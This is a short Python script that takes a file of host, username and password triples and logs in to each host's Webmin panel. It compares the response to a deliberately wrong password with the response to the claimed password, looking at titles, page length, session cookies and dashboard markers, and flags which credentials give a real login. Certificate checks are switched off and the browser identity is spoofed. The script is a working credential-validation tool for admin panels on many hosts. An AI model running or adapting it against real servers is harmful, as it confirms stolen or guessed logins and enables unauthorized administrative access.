#!/usr/bin/env python3
"""Discriminating test: wrong-password vs candidate-password response diff."""
import sys, json, re, requests, urllib3
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
def login(host,u,pw):
    base="https://"+host
    s=requests.Session(); s.verify=False; s.headers.update(UA)
    s.get(base+"/",timeout=12,allow_redirects=False)
    s.get(base+"/session_login.cgi",timeout=12)
    p=s.post(base+"/session_login.cgi",data={"user":u,"pass":pw,"save":"1"},
             headers={"Referer":base+"/session_login.cgi","Content-Type":"application/x-www-form-urlencoded"},
             timeout=12,allow_redirects=True)
    t=p.text or ""
    title=(re.search(r"<title[^>]*>([^<]{0,60})",t,re.I) or [None,None])[1]
    return {"code":p.status_code,"sid":bool(s.cookies.get("sid")),"len":len(t),
            "title":title,
            "login_failed":"Login failed" in t,
            "has_form":"session_login" in t or 'name="pass"' in t,
            "dash": any(x in t for x in ("webmin_logout","system-status","Webmin version","index.cgi?")),
            "snip":re.sub(r"\s+"," ",re.sub(r"<[^>]+>"," ",t[:400]))[:160]}
for line in open(sys.argv[1]):
    line=line.strip()
    if not line: continue
    h,u,pw=line.split("|")
    w=login(h,u,"zzz_wrong_9182_never")
    c=login(h,u,pw)
    same = (w["title"]==c["title"] and w["len"]==c["len"] and w["dash"]==c["dash"])
    print(json.dumps({"host":h,"wrong":w,"claimed":c,"IDENTICAL":same,
                      "REAL_LOGIN": bool(c["dash"] and not same)}),flush=True)
